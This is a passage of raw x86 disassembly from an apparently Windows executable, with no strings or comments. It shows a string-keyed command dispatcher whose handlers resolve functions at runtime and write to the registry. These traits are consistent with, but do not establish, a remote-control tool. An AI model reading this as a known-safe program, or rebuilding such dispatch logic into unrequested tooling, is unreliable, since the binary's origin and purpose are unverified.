  40974e:	e8 45 8a ff ff       	call   0x402198
  409753:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409756:	ff 15 54 02 41 00    	call   *0x410254
  40975c:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40975f:	ff 15 54 02 41 00    	call   *0x410254
  409765:	8a c3                	mov    %bl,%al
  409767:	5e                   	pop    %esi
  409768:	5b                   	pop    %ebx
  409769:	c9                   	leave
  40976a:	c3                   	ret
  40976b:	55                   	push   %ebp
  40976c:	8b ec                	mov    %esp,%ebp
  40976e:	83 ec 34             	sub    $0x34,%esp
  409771:	53                   	push   %ebx
  409772:	56                   	push   %esi
  409773:	57                   	push   %edi
  409774:	be 68 52 41 00       	mov    $0x415268,%esi
  409779:	83 ec 10             	sub    $0x10,%esp
  40977c:	8b cc                	mov    %esp,%ecx
  40977e:	56                   	push   %esi
  40977f:	ff 15 60 02 41 00    	call   *0x410260
  409785:	83 ec 10             	sub    $0x10,%esp
  409788:	8d 45 0c             	lea    0xc(%ebp),%eax
  40978b:	8b cc                	mov    %esp,%ecx
  40978d:	50                   	push   %eax
  40978e:	ff 15 60 02 41 00    	call   *0x410260
  409794:	8d 45 ec             	lea    -0x14(%ebp),%eax
  409797:	50                   	push   %eax
  409798:	e8 18 58 00 00       	call   0x40efb5
  40979d:	83 c4 24             	add    $0x24,%esp
  4097a0:	33 db                	xor    %ebx,%ebx
  4097a2:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4097a5:	53                   	push   %ebx
  4097a6:	e8 de 7a ff ff       	call   0x401289
  4097ab:	50                   	push   %eax
  4097ac:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4097af:	ff 15 60 02 41 00    	call   *0x410260
  4097b5:	8b 3d 38 02 41 00    	mov    0x410238,%edi
  4097bb:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4097be:	68 b0 12 41 00       	push   $0x4112b0
  4097c3:	50                   	push   %eax
  4097c4:	ff d7                	call   *%edi
  4097c6:	59                   	pop    %ecx
  4097c7:	84 c0                	test   %al,%al
  4097c9:	59                   	pop    %ecx
  4097ca:	74 29                	je     0x4097f5
  4097cc:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4097cf:	e8 e1 7a ff ff       	call   0x4012b5
  4097d4:	83 f8 02             	cmp    $0x2,%eax
  4097d7:	76 14                	jbe    0x4097ed
  4097d9:	6a 02                	push   $0x2
  4097db:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4097de:	e8 a6 7a ff ff       	call   0x401289
  4097e3:	8b c8                	mov    %eax,%ecx
  4097e5:	ff 15 58 02 41 00    	call   *0x410258
  4097eb:	8b d8                	mov    %eax,%ebx
  4097ed:	6a 01                	push   $0x1
  4097ef:	53                   	push   %ebx
  4097f0:	e9 e5 03 00 00       	jmp    0x409bda
  4097f5:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4097f8:	68 a4 12 41 00       	push   $0x4112a4
  4097fd:	50                   	push   %eax
  4097fe:	ff d7                	call   *%edi
  409800:	59                   	pop    %ecx
  409801:	84 c0                	test   %al,%al
  409803:	59                   	pop    %ecx
  409804:	0f 84 c1 00 00 00    	je     0x4098cb
  40980a:	6a 03                	push   $0x3
  40980c:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40980f:	e8 75 7a ff ff       	call   0x401289
  409814:	8b c8                	mov    %eax,%ecx
  409816:	ff 15 58 02 41 00    	call   *0x410258
  40981c:	50                   	push   %eax
  40981d:	6a 02                	push   $0x2
  40981f:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409822:	e8 62 7a ff ff       	call   0x401289
  409827:	8b c8                	mov    %eax,%ecx
  409829:	ff 15 58 02 41 00    	call   *0x410258
  40982f:	50                   	push   %eax
  409830:	6a 01                	push   $0x1
  409832:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409835:	e8 4f 7a ff ff       	call   0x401289
  40983a:	83 ec 10             	sub    $0x10,%esp
  40983d:	8b cc                	mov    %esp,%ecx
  40983f:	50                   	push   %eax
  409840:	ff 15 60 02 41 00    	call   *0x410260
  409846:	e8 93 fc ff ff       	call   0x4094de
  40984b:	83 c4 10             	add    $0x10,%esp
  40984e:	50                   	push   %eax
  40984f:	e8 de f8 ff ff       	call   0x409132
  409854:	83 c4 0c             	add    $0xc,%esp
  409857:	3a c3                	cmp    %bl,%al
  409859:	74 38                	je     0x409893
  40985b:	83 ec 10             	sub    $0x10,%esp
  40985e:	8d 45 cc             	lea    -0x34(%ebp),%eax
  409861:	8b fc                	mov    %esp,%edi
  409863:	68 60 05 41 00       	push   $0x410560
  409868:	56                   	push   %esi
  409869:	68 4c 12 41 00       	push   $0x41124c
  40986e:	50                   	push   %eax
  40986f:	e8 a6 63 00 00       	call   0x40fc1a
  409874:	83 c4 0c             	add    $0xc,%esp
  409877:	50                   	push   %eax
  409878:	57                   	push   %edi
  409879:	e8 a2 63 00 00       	call   0x40fc20
  40987e:	83 c4 0c             	add    $0xc,%esp
  409881:	b9 a8 59 41 00       	mov    $0x4159a8,%ecx
  409886:	e8 0d 89 ff ff       	call   0x402198
  40988b:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40988e:	e9 2d 03 00 00       	jmp    0x409bc0
  409893:	83 ec 10             	sub    $0x10,%esp
  409896:	8d 45 cc             	lea    -0x34(%ebp),%eax
  409899:	8b fc                	mov    %esp,%edi
  40989b:	68 5c 05 41 00       	push   $0x41055c
  4098a0:	56                   	push   %esi
  4098a1:	68 4c 12 41 00       	push   $0x41124c
  4098a6:	50                   	push   %eax
  4098a7:	e8 6e 63 00 00       	call   0x40fc1a
  4098ac:	83 c4 0c             	add    $0xc,%esp
  4098af:	50                   	push   %eax
  4098b0:	57                   	push   %edi
  4098b1:	e8 6a 63 00 00       	call   0x40fc20
  4098b6:	83 c4 0c             	add    $0xc,%esp
  4098b9:	b9 a8 59 41 00       	mov    $0x4159a8,%ecx
  4098be:	e8 d5 88 ff ff       	call   0x402198
  4098c3:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  4098c6:	e9 9f 04 00 00       	jmp    0x409d6a
  4098cb:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4098ce:	68 98 12 41 00       	push   $0x411298
  4098d3:	50                   	push   %eax
  4098d4:	ff d7                	call   *%edi
  4098d6:	59                   	pop    %ecx
  4098d7:	84 c0                	test   %al,%al
  4098d9:	59                   	pop    %ecx
  4098da:	0f 84 3c 01 00 00    	je     0x409a1c
  4098e0:	68 88 12 41 00       	push   $0x411288
  4098e5:	68 7c 12 41 00       	push   $0x41127c
  4098ea:	ff 15 40 01 41 00    	call   *0x410140
  4098f0:	50                   	push   %eax
  4098f1:	ff 15 44 01 41 00    	call   *0x410144
  4098f7:	6a 02                	push   $0x2
  4098f9:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4098fc:	a3 f8 59 41 00       	mov    %eax,0x4159f8
  409901:	e8 83 79 ff ff       	call   0x401289
  409906:	8b c8                	mov    %eax,%ecx
  409908:	ff 15 58 02 41 00    	call   *0x410258
  40990e:	50                   	push   %eax
  40990f:	6a 01                	push   $0x1
  409911:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409914:	e8 70 79 ff ff       	call   0x401289
  409919:	83 ec 10             	sub    $0x10,%esp
  40991c:	8b cc                	mov    %esp,%ecx
  40991e:	50                   	push   %eax
  40991f:	ff 15 60 02 41 00    	call   *0x410260
  409925:	e8 b4 fb ff ff       	call   0x4094de
  40992a:	83 c4 10             	add    $0x10,%esp
  40992d:	50                   	push   %eax
  40992e:	ff 15 f8 59 41 00    	call   *0x4159f8
  409934:	3b c3                	cmp    %ebx,%eax
  409936:	0f 85 a8 00 00 00    	jne    0x4099e4
  40993c:	a1 9c 02 41 00       	mov    0x41029c,%eax
  409941:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409944:	ff 30                	push   (%eax)
  409946:	6a 5c                	push   $0x5c
  409948:	6a 02                	push   $0x2
  40994a:	e8 3a 79 ff ff       	call   0x401289
  40994f:	8b c8                	mov    %eax,%ecx
  409951:	ff 15 c0 01 41 00    	call   *0x4101c0
  409957:	8b 0d 9c 02 41 00    	mov    0x41029c,%ecx
  40995d:	3b 01                	cmp    (%ecx),%eax
  40995f:	75 04                	jne    0x409965
  409961:	33 ff                	xor    %edi,%edi
  409963:	eb 2b                	jmp    0x409990
  409965:	50                   	push   %eax
  409966:	8d 45 cc             	lea    -0x34(%ebp),%eax
  409969:	53                   	push   %ebx
  40996a:	50                   	push   %eax
  40996b:	6a 02                	push   $0x2
  40996d:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409970:	e8 14 79 ff ff       	call   0x401289
  409975:	8b c8                	mov    %eax,%ecx
  409977:	ff 15 98 02 41 00    	call   *0x410298
  40997d:	8b c8                	mov    %eax,%ecx
  40997f:	ff 15 58 02 41 00    	call   *0x410258
  409985:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  409988:	8b f8                	mov    %eax,%edi
  40998a:	ff 15 54 02 41 00    	call   *0x410254
  409990:	53                   	push   %ebx
  409991:	57                   	push   %edi
  409992:	6a 01                	push   $0x1
  409994:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409997:	e8 ed 78 ff ff       	call   0x401289
  40999c:	83 ec 10             	sub    $0x10,%esp
  40999f:	8b cc                	mov    %esp,%ecx
  4099a1:	50                   	push   %eax
  4099a2:	ff 15 60 02 41 00    	call   *0x410260
  4099a8:	e8 ca fb ff ff       	call   0x409577
  4099ad:	59                   	pop    %ecx
  4099ae:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4099b1:	59                   	pop    %ecx
  4099b2:	8b fc                	mov    %esp,%edi
  4099b4:	68 38 08 41 00       	push   $0x410838
  4099b9:	56                   	push   %esi
  4099ba:	68 4c 12 41 00       	push   $0x41124c
  4099bf:	50                   	push   %eax
  4099c0:	e8 55 62 00 00       	call   0x40fc1a
  4099c5:	83 c4 0c             	add    $0xc,%esp
  4099c8:	50                   	push   %eax
  4099c9:	57                   	push   %edi
  4099ca:	e8 51 62 00 00       	call   0x40fc20
  4099cf:	83 c4 0c             	add    $0xc,%esp
  4099d2:	b9 a8 59 41 00       	mov    $0x4159a8,%ecx
  4099d7:	e8 bc 87 ff ff       	call   0x402198
  4099dc:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  4099df:	e9 86 03 00 00       	jmp    0x409d6a
  4099e4:	83 ec 10             	sub    $0x10,%esp
  4099e7:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4099ea:	8b fc                	mov    %esp,%edi
  4099ec:	68 3c 08 41 00       	push   $0x41083c
  4099f1:	56                   	push   %esi
  4099f2:	68 4c 12 41 00       	push   $0x41124c
  4099f7:	50                   	push   %eax
  4099f8:	e8 1d 62 00 00       	call   0x40fc1a
  4099fd:	83 c4 0c             	add    $0xc,%esp
  409a00:	50                   	push   %eax
  409a01:	57                   	push   %edi
  409a02:	e8 19 62 00 00       	call   0x40fc20
  409a07:	83 c4 0c             	add    $0xc,%esp
  409a0a:	b9 a8 59 41 00       	mov    $0x4159a8,%ecx
  409a0f:	e8 84 87 ff ff       	call   0x402198
  409a14:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  409a17:	e9 4e 03 00 00       	jmp    0x409d6a
  409a1c:	8d 45 dc             	lea    -0x24(%ebp),%eax
  409a1f:	68 70 12 41 00       	push   $0x411270
  409a24:	50                   	push   %eax
  409a25:	ff d7                	call   *%edi
  409a27:	59                   	pop    %ecx
  409a28:	84 c0                	test   %al,%al
  409a2a:	59                   	pop    %ecx
  409a2b:	0f 84 04 02 00 00    	je     0x409c35
  409a31:	6a 04                	push   $0x4
  409a33:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409a36:	e8 4e 78 ff ff       	call   0x401289
  409a3b:	8b c8                	mov    %eax,%ecx
  409a3d:	ff 15 58 02 41 00    	call   *0x410258
  409a43:	50                   	push   %eax
  409a44:	ff 15 9c 03 41 00    	call   *0x41039c
  409a4a:	83 f8 04             	cmp    $0x4,%eax
  409a4d:	59                   	pop    %ecx
  409a4e:	0f 84 d4 00 00 00    	je     0x409b28
  409a54:	83 f8 0b             	cmp    $0xb,%eax
  409a57:	74 69                	je     0x409ac2
  409a59:	50                   	push   %eax
  409a5a:	6a 05                	push   $0x5
  409a5c:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409a5f:	e8 25 78 ff ff       	call   0x401289
  409a64:	83 ec 10             	sub    $0x10,%esp
  409a67:	8b cc                	mov    %esp,%ecx
  409a69:	50                   	push   %eax
  409a6a:	ff 15 60 02 41 00    	call   *0x410260
  409a70:	6a 03                	push   $0x3
  409a72:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409a75:	e8 0f 78 ff ff       	call   0x401289
  409a7a:	8b c8                	mov    %eax,%ecx
  409a7c:	ff 15 58 02 41 00    	call   *0x410258
  409a82:	50                   	push   %eax
  409a83:	6a 02                	push   $0x2
  409a85:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409a88:	e8 fc 77 ff ff       	call   0x401289
  409a8d:	8b c8                	mov    %eax,%ecx
  409a8f:	ff 15 58 02 41 00    	call   *0x410258
  409a95:	50                   	push   %eax
  409a96:	6a 01                	push   $0x1
  409a98:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409a9b:	e8 e9 77 ff ff       	call   0x401289
  409aa0:	83 ec 10             	sub    $0x10,%esp
  409aa3:	8b cc                	mov    %esp,%ecx
  409aa5:	50                   	push   %eax
  409aa6:	ff 15 60 02 41 00    	call   *0x410260
  409aac:	e8 2d fa ff ff       	call   0x4094de
  409ab1:	83 c4 10             	add    $0x10,%esp
  409ab4:	50                   	push   %eax
  409ab5:	e8 20 f5 ff ff       	call   0x408fda
  409aba:	83 c4 20             	add    $0x20,%esp
  409abd:	e9 c7 00 00 00       	jmp    0x409b89
  409ac2:	6a 05                	push   $0x5
  409ac4:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409ac7:	e8 bd 77 ff ff       	call   0x401289
  409acc:	8b c8                	mov    %eax,%ecx
  409ace:	ff 15 58 02 41 00    	call   *0x410258
  409ad4:	ff 70 04             	push   0x4(%eax)
  409ad7:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409ada:	ff 30                	push   (%eax)
  409adc:	6a 03                	push   $0x3
  409ade:	e8 a6 77 ff ff       	call   0x401289
  409ae3:	8b c8                	mov    %eax,%ecx
  409ae5:	ff 15 58 02 41 00    	call   *0x410258
  409aeb:	50                   	push   %eax
  409aec:	6a 02                	push   $0x2
  409aee:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409af1:	e8 93 77 ff ff       	call   0x401289
  409af6:	8b c8                	mov    %eax,%ecx
  409af8:	ff 15 58 02 41 00    	call   *0x410258
  409afe:	50                   	push   %eax
  409aff:	6a 01                	push   $0x1
  409b01:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409b04:	e8 80 77 ff ff       	call   0x401289
  409b09:	83 ec 10             	sub    $0x10,%esp
  409b0c:	8b cc                	mov    %esp,%ecx
  409b0e:	50                   	push   %eax
  409b0f:	ff 15 60 02 41 00    	call   *0x410260
  409b15:	e8 c4 f9 ff ff       	call   0x4094de
  409b1a:	83 c4 10             	add    $0x10,%esp
  409b1d:	50                   	push   %eax
  409b1e:	e8 68 f5 ff ff       	call   0x40908b
  409b23:	83 c4 14             	add    $0x14,%esp
  409b26:	eb 61                	jmp    0x409b89
  409b28:	6a 05                	push   $0x5
  409b2a:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409b2d:	e8 57 77 ff ff       	call   0x401289
  409b32:	8b c8                	mov    %eax,%ecx
  409b34:	ff 15 58 02 41 00    	call   *0x410258
  409b3a:	ff 30                	push   (%eax)
  409b3c:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409b3f:	6a 03                	push   $0x3
  409b41:	e8 43 77 ff ff       	call   0x401289
  409b46:	8b c8                	mov    %eax,%ecx
  409b48:	ff 15 58 02 41 00    	call   *0x410258
  409b4e:	50                   	push   %eax
  409b4f:	6a 02                	push   $0x2
  409b51:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409b54:	e8 30 77 ff ff       	call   0x401289
  409b59:	8b c8                	mov    %eax,%ecx
  409b5b:	ff 15 58 02 41 00    	call   *0x410258
  409b61:	50                   	push   %eax
  409b62:	6a 01                	push   $0x1
  409b64:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409b67:	e8 1d 77 ff ff       	call   0x401289
  409b6c:	83 ec 10             	sub    $0x10,%esp
  409b6f:	8b cc                	mov    %esp,%ecx
  409b71:	50                   	push   %eax
  409b72:	ff 15 60 02 41 00    	call   *0x410260
  409b78:	e8 61 f9 ff ff       	call   0x4094de
  409b7d:	83 c4 10             	add    $0x10,%esp
  409b80:	50                   	push   %eax
  409b81:	e8 c0 f4 ff ff       	call   0x409046
  409b86:	83 c4 10             	add    $0x10,%esp
  409b89:	3a c3                	cmp    %bl,%al
  409b8b:	74 70                	je     0x409bfd
  409b8d:	83 ec 10             	sub    $0x10,%esp
  409b90:	8d 45 cc             	lea    -0x34(%ebp),%eax
  409b93:	8b fc                	mov    %esp,%edi
  409b95:	68 4c 08 41 00       	push   $0x41084c
  409b9a:	56                   	push   %esi
  409b9b:	68 4c 12 41 00       	push   $0x41124c
  409ba0:	50                   	push   %eax
  409ba1:	e8 74 60 00 00       	call   0x40fc1a
  409ba6:	83 c4 0c             	add    $0xc,%esp
  409ba9:	50                   	push   %eax
  409baa:	57                   	push   %edi
  409bab:	e8 70 60 00 00       	call   0x40fc20
  409bb0:	83 c4 0c             	add    $0xc,%esp
  409bb3:	b9 a8 59 41 00       	mov    $0x4159a8,%ecx
  409bb8:	e8 db 85 ff ff       	call   0x402198
  409bbd:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  409bc0:	ff 15 54 02 41 00    	call   *0x410254
  409bc6:	53                   	push   %ebx
  409bc7:	6a 02                	push   $0x2
  409bc9:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409bcc:	e8 b8 76 ff ff       	call   0x401289
  409bd1:	8b c8                	mov    %eax,%ecx
  409bd3:	ff 15 58 02 41 00    	call   *0x410258
  409bd9:	50                   	push   %eax
  409bda:	6a 01                	push   $0x1
  409bdc:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409bdf:	e8 a5 76 ff ff       	call   0x401289
  409be4:	83 ec 10             	sub    $0x10,%esp
  409be7:	8b cc                	mov    %esp,%ecx
  409be9:	50                   	push   %eax
  409bea:	ff 15 60 02 41 00    	call   *0x410260
  409bf0:	e8 82 f9 ff ff       	call   0x409577
  409bf5:	83 c4 18             	add    $0x18,%esp
  409bf8:	e9 73 01 00 00       	jmp    0x409d70
  409bfd:	83 ec 10             	sub    $0x10,%esp
  409c00:	8d 45 cc             	lea    -0x34(%ebp),%eax
  409c03:	8b fc                	mov    %esp,%edi
  409c05:	68 50 08 41 00       	push   $0x410850
  409c0a:	56                   	push   %esi
  409c0b:	68 4c 12 41 00       	push   $0x41124c
  409c10:	50                   	push   %eax
  409c11:	e8 04 60 00 00       	call   0x40fc1a
  409c16:	83 c4 0c             	add    $0xc,%esp
  409c19:	50                   	push   %eax
  409c1a:	57                   	push   %edi
  409c1b:	e8 00 60 00 00       	call   0x40fc20
  409c20:	83 c4 0c             	add    $0xc,%esp
  409c23:	b9 a8 59 41 00       	mov    $0x4159a8,%ecx
  409c28:	e8 6b 85 ff ff       	call   0x402198
  409c2d:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  409c30:	e9 35 01 00 00       	jmp    0x409d6a
  409c35:	8d 45 dc             	lea    -0x24(%ebp),%eax
  409c38:	68 60 12 41 00       	push   $0x411260
  409c3d:	50                   	push   %eax
  409c3e:	ff d7                	call   *%edi
  409c40:	59                   	pop    %ecx
  409c41:	84 c0                	test   %al,%al
  409c43:	59                   	pop    %ecx
  409c44:	0f 84 26 01 00 00    	je     0x409d70
  409c4a:	8d 45 fc             	lea    -0x4(%ebp),%eax
  409c4d:	53                   	push   %ebx
  409c4e:	50                   	push   %eax
  409c4f:	53                   	push   %ebx
  409c50:	68 06 00 02 00       	push   $0x20006
  409c55:	53                   	push   %ebx
  409c56:	53                   	push   %ebx
  409c57:	53                   	push   %ebx
  409c58:	6a 02                	push   $0x2
  409c5a:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409c5d:	e8 27 76 ff ff       	call   0x401289
  409c62:	8b c8                	mov    %eax,%ecx
  409c64:	ff 15 58 02 41 00    	call   *0x410258
  409c6a:	50                   	push   %eax
  409c6b:	6a 01                	push   $0x1
  409c6d:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409c70:	e8 14 76 ff ff       	call   0x401289
  409c75:	83 ec 10             	sub    $0x10,%esp
  409c78:	8b cc                	mov    %esp,%ecx
  409c7a:	50                   	push   %eax
  409c7b:	ff 15 60 02 41 00    	call   *0x410260
  409c81:	e8 58 f8 ff ff       	call   0x4094de
  409c86:	83 c4 10             	add    $0x10,%esp
  409c89:	50                   	push   %eax
  409c8a:	ff 15 0c 00 41 00    	call   *0x41000c
  409c90:	ff 75 fc             	push   -0x4(%ebp)
  409c93:	8b f8                	mov    %eax,%edi
  409c95:	ff 15 30 00 41 00    	call   *0x410030
  409c9b:	3b fb                	cmp    %ebx,%edi
  409c9d:	0f 85 94 00 00 00    	jne    0x409d37
  409ca3:	83 ec 10             	sub    $0x10,%esp
  409ca6:	8d 45 cc             	lea    -0x34(%ebp),%eax
  409ca9:	8b fc                	mov    %esp,%edi
  409cab:	68 40 08 41 00       	push   $0x410840
  409cb0:	56                   	push   %esi
  409cb1:	68 4c 12 41 00       	push   $0x41124c
  409cb6:	50                   	push   %eax
  409cb7:	e8 5e 5f 00 00       	call   0x40fc1a
  409cbc:	83 c4 0c             	add    $0xc,%esp
  409cbf:	50                   	push   %eax
  409cc0:	57                   	push   %edi
  409cc1:	e8 5a 5f 00 00       	call   0x40fc20
  409cc6:	83 c4 0c             	add    $0xc,%esp
  409cc9:	b9 a8 59 41 00       	mov    $0x4159a8,%ecx
  409cce:	e8 c5 84 ff ff       	call   0x402198
  409cd3:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  409cd6:	ff 15 54 02 41 00    	call   *0x410254
  409cdc:	a1 9c 02 41 00       	mov    0x41029c,%eax
  409ce1:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409ce4:	ff 30                	push   (%eax)
  409ce6:	6a 5c                	push   $0x5c
  409ce8:	6a 02                	push   $0x2
  409cea:	e8 9a 75 ff ff       	call   0x401289
  409cef:	8b c8                	mov    %eax,%ecx
  409cf1:	ff 15 c0 01 41 00    	call   *0x4101c0
  409cf7:	8b 0d 9c 02 41 00    	mov    0x41029c,%ecx
  409cfd:	3b 01                	cmp    (%ecx),%eax
  409cff:	75 04                	jne    0x409d05
  409d01:	33 f6                	xor    %esi,%esi
  409d03:	eb 2b                	jmp    0x409d30
  409d05:	50                   	push   %eax
  409d06:	8d 45 cc             	lea    -0x34(%ebp),%eax
  409d09:	53                   	push   %ebx
  409d0a:	50                   	push   %eax
  409d0b:	6a 02                	push   $0x2
  409d0d:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409d10:	e8 74 75 ff ff       	call   0x401289
  409d15:	8b c8                	mov    %eax,%ecx
  409d17:	ff 15 98 02 41 00    	call   *0x410298
  409d1d:	8b c8                	mov    %eax,%ecx
  409d1f:	ff 15 58 02 41 00    	call   *0x410258
  409d25:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  409d28:	8b f0                	mov    %eax,%esi
  409d2a:	ff 15 54 02 41 00    	call   *0x410254
  409d30:	53                   	push   %ebx
  409d31:	56                   	push   %esi
  409d32:	e9 a3 fe ff ff       	jmp    0x409bda
  409d37:	83 ec 10             	sub    $0x10,%esp
  409d3a:	8d 45 cc             	lea    -0x34(%ebp),%eax
  409d3d:	8b fc                	mov    %esp,%edi
  409d3f:	68 34 08 41 00       	push   $0x410834
  409d44:	56                   	push   %esi
  409d45:	68 4c 12 41 00       	push   $0x41124c
  409d4a:	50                   	push   %eax
  409d4b:	e8 ca 5e 00 00       	call   0x40fc1a
  409d50:	83 c4 0c             	add    $0xc,%esp
  409d53:	50                   	push   %eax
  409d54:	57                   	push   %edi
  409d55:	e8 c6 5e 00 00       	call   0x40fc20
  409d5a:	83 c4 0c             	add    $0xc,%esp
  409d5d:	b9 a8 59 41 00       	mov    $0x4159a8,%ecx
  409d62:	e8 31 84 ff ff       	call   0x402198
  409d67:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  409d6a:	ff 15 54 02 41 00    	call   *0x410254
  409d70:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  409d73:	ff 15 54 02 41 00    	call   *0x410254
  409d79:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409d7c:	e8 bb 7d ff ff       	call   0x401b3c
  409d81:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  409d84:	ff 15 54 02 41 00    	call   *0x410254
  409d8a:	5f                   	pop    %edi
  409d8b:	5e                   	pop    %esi
  409d8c:	33 c0                	xor    %eax,%eax
  409d8e:	5b                   	pop    %ebx
  409d8f:	c9                   	leave
  409d90:	c3                   	ret
  409d91:	55                   	push   %ebp
  409d92:	8b ec                	mov    %esp,%ebp
  409d94:	83 ec 10             	sub    $0x10,%esp
  409d97:	53                   	push   %ebx
  409d98:	bb a8 59 41 00       	mov    $0x4159a8,%ebx
  409d9d:	56                   	push   %esi
  409d9e:	57                   	push   %edi
  409d9f:	8b cb                	mov    %ebx,%ecx
  409da1:	e8 63 83 ff ff       	call   0x402109
  409da6:	83 ec 10             	sub    $0x10,%esp
  409da9:	be 78 52 41 00       	mov    $0x415278,%esi
  409dae:	8b fc                	mov    %esp,%edi
  409db0:	8b cb                	mov    %ebx,%ecx
  409db2:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409db3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409db4:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409db5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409db6:	e8 ad 83 ff ff       	call   0x402168
  409dbb:	83 ec 10             	sub    $0x10,%esp
  409dbe:	8d 45 08             	lea    0x8(%ebp),%eax
  409dc1:	8b f4                	mov    %esp,%esi
  409dc3:	50                   	push   %eax
  409dc4:	68 68 52 41 00       	push   $0x415268
  409dc9:	8d 45 f0             	lea    -0x10(%ebp),%eax
  409dcc:	68 b8 12 41 00       	push   $0x4112b8
  409dd1:	50                   	push   %eax
  409dd2:	e8 43 5e 00 00       	call   0x40fc1a
  409dd7:	83 c4 0c             	add    $0xc,%esp
  409dda:	50                   	push   %eax
  409ddb:	56                   	push   %esi
  409ddc:	e8 33 5e 00 00       	call   0x40fc14
  409de1:	83 c4 0c             	add    $0xc,%esp
  409de4:	8b cb                	mov    %ebx,%ecx
  409de6:	e8 ad 83 ff ff       	call   0x402198
  409deb:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  409dee:	ff 15 54 02 41 00    	call   *0x410254
  409df4:	6a 00                	push   $0x0
  409df6:	68 6b 97 40 00       	push   $0x40976b
  409dfb:	8b cb                	mov    %ebx,%ecx
  409dfd:	e8 1a 84 ff ff       	call   0x40221c
  409e02:	8d 4d 08             	lea    0x8(%ebp),%ecx
  409e05:	ff 15 54 02 41 00    	call   *0x410254
  409e0b:	5f                   	pop    %edi
  409e0c:	5e                   	pop    %esi
  409e0d:	5b                   	pop    %ebx
  409e0e:	c9                   	leave
  409e0f:	c3                   	ret
  409e10:	e8 05 00 00 00       	call   0x409e1a
  409e15:	e9 0d 00 00 00       	jmp    0x409e27
  409e1a:	6a 00                	push   $0x0
  409e1c:	b9 30 5a 41 00       	mov    $0x415a30,%ecx
  409e21:	e8 bb 82 ff ff       	call   0x4020e1
  409e26:	c3                   	ret
  409e27:	68 33 9e 40 00       	push   $0x409e33
  409e2c:	e8 89 5e 00 00       	call   0x40fcba
  409e31:	59                   	pop    %ecx
  409e32:	c3                   	ret
  409e33:	b9 30 5a 41 00       	mov    $0x415a30,%ecx
  409e38:	e9 99 83 ff ff       	jmp    0x4021d6
  409e3d:	e8 05 00 00 00       	call   0x409e47
  409e42:	e9 15 00 00 00       	jmp    0x409e5c
  409e47:	55                   	push   %ebp
  409e48:	8b ec                	mov    %esp,%ebp
  409e4a:	51                   	push   %ecx
  409e4b:	8d 45 ff             	lea    -0x1(%ebp),%eax
  409e4e:	b9 20 5a 41 00       	mov    $0x415a20,%ecx
  409e53:	50                   	push   %eax
  409e54:	ff 15 50 02 41 00    	call   *0x410250
  409e5a:	c9                   	leave
  409e5b:	c3                   	ret
  409e5c:	68 68 9e 40 00       	push   $0x409e68
  409e61:	e8 54 5e 00 00       	call   0x40fcba
  409e66:	59                   	pop    %ecx
  409e67:	c3                   	ret
  409e68:	b9 20 5a 41 00       	mov    $0x415a20,%ecx
  409e6d:	ff 25 54 02 41 00    	jmp    *0x410254
  409e73:	55                   	push   %ebp
  409e74:	8b ec                	mov    %esp,%ebp
  409e76:	81 ec 34 03 00 00    	sub    $0x334,%esp
  409e7c:	53                   	push   %ebx
  409e7d:	56                   	push   %esi
  409e7e:	be 40 59 41 00       	mov    $0x415940,%esi
  409e83:	57                   	push   %edi
  409e84:	6a 29                	push   $0x29
  409e86:	8b ce                	mov    %esi,%ecx
  409e88:	e8 fc 73 ff ff       	call   0x401289
  409e8d:	8b c8                	mov    %eax,%ecx
  409e8f:	ff 15 58 02 41 00    	call   *0x410258
  409e95:	50                   	push   %eax
  409e96:	ff 15 9c 03 41 00    	call   *0x41039c
  409e9c:	85 c0                	test   %eax,%eax
  409e9e:	59                   	pop    %ecx
